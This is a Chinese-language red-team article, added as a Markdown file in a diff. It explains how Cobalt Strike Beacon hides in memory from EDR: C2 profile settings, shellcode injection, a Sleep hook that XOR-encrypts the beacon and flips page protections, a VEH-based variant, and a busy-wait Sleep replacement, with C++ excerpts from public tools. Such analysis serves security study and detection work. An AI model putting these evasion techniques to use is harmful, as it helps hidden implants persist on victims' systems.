@@ -1,0 +1,459 @@
+# 内存规避技术
+
+## 修改C2.profile
+
+### beacon内存属性
+
+在默认情况下Beacon会在RWX/WCX权限的内存空间执行，这种敏感的内存属性会使得Beacon存在的内存空间更易被发现。  
+![](https://image.3001.net/images/20230321/1679387785_64196c8990e8fddd381dc.png!small)
+
+### beacon静态特征
+
+未使用C2 Profile下RWX/WCX的内存区域中存储的即是完整的明文Beacon。  
+![](https://image.3001.net/images/20230321/1679387786_64196c8a7929f2f236dbd.png!small)
+
+### beacon定制隐匿
+
+通过修改C2.profile来对Beacon的内存属性静态特征等做进一步的定制和隐匿：
+
+  1. 自定义内存属性 rwx/rx。
+
+  2. 自定义或删除文件头。
+
+  3. 自定义命名管道名称、替换字符串。  
+cs在4+可以直接进行相关配置。配置文件格式可以参考：  
+https://bigb0sss.github.io/posts/redteam-cobalt-strike-malleable-profile/  
+![](https://image.3001.net/images/20230321/1679387787_64196c8b4354db8f5b141.png!small)
+
+## beacon内存加密
+
+https://github.com/mgeeky/ShellcodeFluctuation  
+Cobalt Strike默认对命令有60s的等待时间，我们可以通过sleep
+x命令修改这个时间。通过sleep实现了beacon的通讯间隔控制。beacon中调用系统sleep进行休眠，teamserver实现一种消息队列，将命令存储在消息队列中。当beacon连接teamserver时读取命令并执行。
+
+常规的cs在sleep休眠时，线程返回地址会指向驻留在内存中的shellcode。通过检查可疑进程中线程的返回地址，我们注入的shellcode很容易被发现。
+
+### 加密原理
+
+#### 方式1
+
+beacon线程在执行sleep函数的时候，会自动将shellcode的内存加密并修改属性为不可执行，再执行正常的sleep函数。执行成功后恢复shellcode并使之可以执行，等待下一次连接重复上述操作。在sleep函数真正执行的过程中，shellcode为不可执行属性可以绕过edr的检查。
+
+#### 方式2
+
+注册VEH处理`NO_ACCESS`访问异常，加密内存段，修改权限为RX。然后在睡眠之前，将内存属性改为`NO_ACCESS`。当`Sleep`函数返回时就会触发异常访问。VEH接收到异常后进行相应的解密，恢复正确的内存属性，用于规避对Sleep
+hook的检测。
+
+### 加密分析
+
+参考文章：https://xz.aliyun.com/t/11532#toc-8
+
+#### 方式1
+
+##### 加载二进制文件
+
+通过CreateFileA加载外部资源文件。
+
+    
+    
+    bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
+    {
+    	HandlePtr file(CreateFileA(
+    		path,
+    		GENERIC_READ,
+    		FILE_SHARE_READ,
+    		NULL,
+    		OPEN_EXISTING,
+    		0,
+    		NULL
+    	), &::CloseHandle);
+    	if (INVALID_HANDLE_VALUE == file.get())
+    		return false;
+    	
+    	DWORD highSize;
+    	DWORD readBytes = 0;
+    	DWORD lowSize = GetFileSize(file.get(), &highSize);
+    	shellcode.resize(lowSize, 0);
+    	return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
+    }
+    
+    if (argc < 3)
+    {
+    	log("Usage: ShellcodeFluctuation.exe <shellcode> <fluctuate>");
+    	log("<fluctuate>:\n\t-1 - Read shellcode but dont inject it. Run in an infinite loop.");
+    	log("\t0 - Inject the shellcode but don't hook kernel32!Sleep and don't encrypt anything");
+    	log("\t1 - Inject shellcode and start fluctuating its memory with standard PAGE_READWRITE.");
+    	log("\t2 - Inject shellcode and start fluctuating its memory with ORCA666's PAGE_NOACCESS.");
+    	return 1;
+    }
+    
+    std::vector<uint8_t> shellcode;
+    
+    if (!readShellcode(argv[1], shellcode))
+    {
+    	log("[!] Could not open shellcode file! Error: ", ::GetLastError());
+    	return 1;
+    }
+    
+
+查看TypeOfFluctuation的定义，是个枚举类。
+
+    
+    
+    try
+    {
+    	g_fluctuate = (TypeOfFluctuation)1;
+    }
+    catch (...)
+    {
+    	log("[!] Invalid <fluctuate> mode provided");
+    	return 1;
+    }
+    
+
+![](https://image.3001.net/images/20230321/1679387787_64196c8bdf2627f16cafa.png!small)
+
+  * 0：表示不对内存操作 。
+
+  * 1：表示将内存标识为RW。
+
+  * 2：表示将内存标识为NO_ACCESS，通过异常处理机制注册VEX实现修改代码执行逻辑。
+
+##### 注入运行Shellcode
+
+注入Shellcode：`VirtualAlloc`\+ `memcpy`\+ `CreateThread`，并返回进程PID。
+
+    
+    
+    HandlePtr thread(NULL, &::CloseHandle);
+    if (!injectShellcode(shellcode, thread))
+    {
+    	log("[!] Could not inject shellcode! Error: ", ::GetLastError());
+    	return 1;
+    }
+    log("[+] Shellcode is now running. PID = ", std::dec, GetCurrentProcessId());
+    
+
+![](https://image.3001.net/images/20230321/1679387788_64196c8cb2ba332474d56.png!small)
+
+##### hook Sleep函数
+
+若内存标识被标识为RW，则对Sleep函数进行hook，跟进查看定义。
+
+    
+    
+    if (g_fluctuate != NoFluctuation)
+    {
+    	log("[.] Hooking kernel32!Sleep...");
+    	if (!hookSleep())
+    	{
+    		log("[!] Could not hook kernel32!Sleep!");
+    		return 1;
+    	}
+    }
+    else
+    {
+    	log("[.] Shellcode will not fluctuate its memory pages protection.");
+    }
+    
+
+![](https://image.3001.net/images/20230321/1679387789_64196c8d61966418e15f8.png!small)
+
+hook Sleep函数如下，主要通过fastTrampoline函数进行hook。
+
+    
+    
+    bool hookSleep()
+    {
+        HookTrampolineBuffers buffers = { 0 };
+        buffers.previousBytes = g_hookedSleep.sleepStub;
+        buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);
+    
+        g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(::Sleep);
+    
+        if (!fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep, &buffers))
+            return false;
+    
+        return true;
+    }
+    
+
+> addressToHook：是原本Sleep函数所在的位置。  
+> jumpAddress：为Mysleep函数所在的位置。  
+>
+> ![](https://image.3001.net/images/20230321/1679387790_64196c8e08c0a848bd790.png!small)
+
+一旦Beacon进行休眠，MySleep回调函数被调用，beacon线程进入MySleep函数，实现Hook，HOOK过程如下：  
+![](https://image.3001.net/images/20230321/1679387790_64196c8e9ed6391bec3cb.png!small)
+
+将addressToHook为起始地址的内存属性修改为RWX，先将起始地址内容进行保存，然后将起始地址修改为trampoline中存储的指令。
+
+    
+    
+    if (installHook)
+    {
+    	if (buffers != NULL)
+    	{
+    		if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
+    			return false;
+    
+    		memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
+    	}
+    
+    	if (::VirtualProtect(
+    		addressToHook,
+    		dwSize,
+    		PAGE_EXECUTE_READWRITE,
+    		&oldProt
+    	))
+    	{
+    		memcpy(addressToHook, trampoline, dwSize);
+    		output = true;
+    	}
+    }
+    
+
+hook前的addressToHook。  
+![](https://image.3001.net/images/20230321/1679387791_64196c8f52dafd2a28ff3.png!small)
+
+hook后的addressToHook。  
+![](https://image.3001.net/images/20230321/1679387792_64196c90565813a53b80d.png!small)
+
+NtFlushInstructionCache刷新指定进程的指令高速缓存，让CPU加载新的指令，主进程跳到MySleep函数地址。
+
+    
+    
+    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
+    if (!pNtFlushInstructionCache)
+    {
+    	pNtFlushInstructionCache = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
+    }
+    
+    pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
+    
+
+通过创建进程的方式启动beacon，MySleep函数一共做了几件事情:
+
+    
+    
+    void WINAPI MySleep(DWORD dwMilliseconds)
+    {
+        const LPVOID caller = (LPVOID)_ReturnAddress();
+        initializeShellcodeFluctuation(caller);
+        shellcodeEncryptDecrypt(caller);
+    
+        log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");
+    
+        HookTrampolineBuffers buffers = { 0 };
+        buffers.originalBytes = g_hookedSleep.sleepStub;
+        buffers.originalBytesSize = sizeof(g_hookedSleep.sleepStub);
+    
+        fastTrampoline(false, (BYTE*)::Sleep, (void*)&MySleep, &buffers);
+    
+        // Perform sleep emulating originally hooked functionality.
+        ::Sleep(dwMilliseconds);
+    
+        if (g_fluctuate == FluctuateToRW)
+        {
+            shellcodeEncryptDecrypt((LPVOID)caller);
+        }
+        else
+        {
+    
+        }
+    
+        fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep);
+    }
+    
+
+##### 搜索Shellcode地址
+
+initializeShellcodeFluctuation：主要从mysleep的返回地址的内存进行搜索，找到shellcode的地址，通过不停的遍历，将所有存储内存块信息的对象mbi的首地址放入容器。后续判断sleep的返回地址是否在这块内存中定位到shellcode的内存段，随后完成对g_fluctuationData对象的初始化赋值:  
+![](https://image.3001.net/images/20230321/1679387793_64196c912a03f5ab424ea.png!small)
+
+g_fluctuationData主要包括shellcode内存块的位置，大小，是否加密，加密key等属性。
+
+    
+    
+    struct FluctuationMetadata
+    {
+        LPVOID shellcodeAddr;
+        SIZE_T shellcodeSize;
+        bool currentlyEncrypted;
+        DWORD encodeKey;
+        DWORD protect;
+    };
+    
+
+随机生成密钥：
+
+    
+    
+    std::random_device dev;
+    std::mt19937 rng(dev());
+    std::uniform_int_distribution<std::mt19937::result_type> dist4GB(0, 0xffffffff);
+    
+    g_fluctuationData.encodeKey = dist4GB(rng);
+    
+
+定义memoryMap是存储内存块的一个容器，跟进collectMemoryMap函数，VirtualQueryEx返回一个MEMORY_BASIC_INFORMATION对象，其RegionSize表示这块内存的大小。
+
+    
+    
+    std::vector<MEMORY_BASIC_INFORMATION> collectMemoryMap(HANDLE hProcess, DWORD Type)
+    {
+        std::vector<MEMORY_BASIC_INFORMATION> out;
+        const size_t MaxSize = (sizeof(ULONG_PTR) == 4) ? ((1ULL << 31) - 1) : ((1ULL << 63) - 1);
+    
+        uint8_t* address = 0;
+        while (reinterpret_cast<size_t>(address) < MaxSize)
+        {
+            MEMORY_BASIC_INFORMATION mbi = { 0 };
+    
+            if (!VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)))
+            {
+                break;
+            }
+    
+            if ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_READWRITE)
+                && ((mbi.Type & Type) != 0))
+            {
+                out.push_back(mbi);
+            }
+    
+            address += mbi.RegionSize;
+        }
+    
+        return out;
+    }
+    
+
+##### Shellcode加密
+
+之后对shellcode进行xor加密，并将内存设为RW属性，没加密之前的内存:  
+![](https://image.3001.net/images/20230321/1679387793_64196c91eabe8b4548d41.png!small)
+
+加密之后的内存如下，密钥为0x9c43d949：  
+![](https://image.3001.net/images/20230321/1679387795_64196c9348599c923168d.png!small)
+
+##### 取消hook执行sleep函数
+
+之后取消掉hook并执行常规的sleep:  
+![](https://image.3001.net/images/20230321/1679387796_64196c94550997905866a.png!small)
+
+##### Shellcode解密并执行
+
+等待cs profile设置的时间后，解密shellcode，并设置内存属性为RX，恢复代码执行：  
+![](https://image.3001.net/images/20230321/1679387797_64196c950b7ca5cc0ad48.png!small)
+
+##### 重新hook sleep函数
+
+并且重新hook sleep函数，并将内存重置，以便下次执行：  
+![](https://image.3001.net/images/20230321/1679387797_64196c95b56814a94925f.png!small)
+
+#### 方式2
+
+##### 注册VEH
+
+在注入并启动shellcode之前，注册异常处理程序 (VEH) 以来捕获访问冲突异常。
+
+    
+    
+    AddVectoredExceptionHandler(1, &VEHHandler);
+    
+
+##### shellcode加密
+
+一旦Beacon尝试休眠，MySleep回调函数被调用，beacon线程进入MySleep函数，在加密shellcode后标识为No_Access。
+
+    
+    
+    if (!g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA)
+    {
+    	::VirtualProtect(
+    		g_fluctuationData.shellcodeAddr,
+    		g_fluctuationData.shellcodeSize,
+    		PAGE_NOACCESS,
+    		&oldProt
+    	);
+    
+    	log("[>] Flipped to No Access.\n");
+    }
+    
+
+![](https://image.3001.net/images/20230321/1679387798_64196c9687786c32f7329.png!small)
+
+##### 恢复代码执行
+
+hook sleep后，Shellcode尝试恢复其执行，这导致抛出访问冲突，因为它的页面被标记为
+No_Access，VEH处理程序捕获异常，解密shellcode，将内存属性重新设为RX，恢复代码的执行。
+
+    
+    
+    else if (g_fluctuationData.currentlyEncrypted)
+    {
+    	::VirtualProtect(
+    		g_fluctuationData.shellcodeAddr,
+    		g_fluctuationData.shellcodeSize,
+    		g_fluctuationData.protect,
+    		&oldProt
+    	);
+    
+    	log("[<] Flipped back to RX/RWX.\n");
+    }
+    
+
+![](https://image.3001.net/images/20230321/1679387799_64196c972ddf91662f8b4.png!small)
+
+## beacon内存替换
+
+https://github.com/CodeXTF2/BusySleepBeacon
+
+### 替换原理
+
+Beacon会在回调过程中尝试调用sleep函数。在调用sleep的过程中，会将线程的状态设置为"DelayExecution"，而我们就可以将其作为一个指标来识别线程是否在执行某个Beacon。  
+![](https://image.3001.net/images/20230321/1679387799_64196c97c0a4fce318176.png!small)
+
+### 替换分析
+
+一旦Beacon进行休眠，MySleep回调函数被调用，beacon线程进入MySleep函数，执行Wait函数，替换原本的sleep函数，防止线程进入DelayExecution状态。
+
+    
+    
+    bool Wait(const unsigned long& Time)
+    {
+        clock_t Tick = clock_t(float(clock()) / float(CLOCKS_PER_SEC) * 1000.f);
+        if (Tick < 0) // if clock() fails, it returns -1
+            return 0;
+        clock_t Now = clock_t(float(clock()) / float(CLOCKS_PER_SEC) * 1000.f);
+        if (Now < 0)
+            return 0;
+        while ((Now - Tick) < Time)
+        {
+            Now = clock_t(float(clock()) / float(CLOCKS_PER_SEC) * 1000.f);
+            if (Now < 0)
+                return 0;
+        }
+        return 1;
+    }
+    
+    void WINAPI MySleep(DWORD dwMilliseconds)
+    {
+        const LPVOID caller = (LPVOID)_ReturnAddress();
+    
+        HookTrampolineBuffers buffers = { 0 };
+        buffers.originalBytes = g_hookedSleep.sleepStub;
+        buffers.originalBytesSize = sizeof(g_hookedSleep.sleepStub);
+    
+        fastTrampoline(false, (BYTE*)::Sleep, (void*)&MySleep, &buffers);
+    
+        if (!Wait(dwMilliseconds))
+        { 
+    
+        }
+        fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep);
+    }
+    
+
+![](https://image.3001.net/images/20230321/1679387800_64196c987bf793ab5e903.png!small)
+
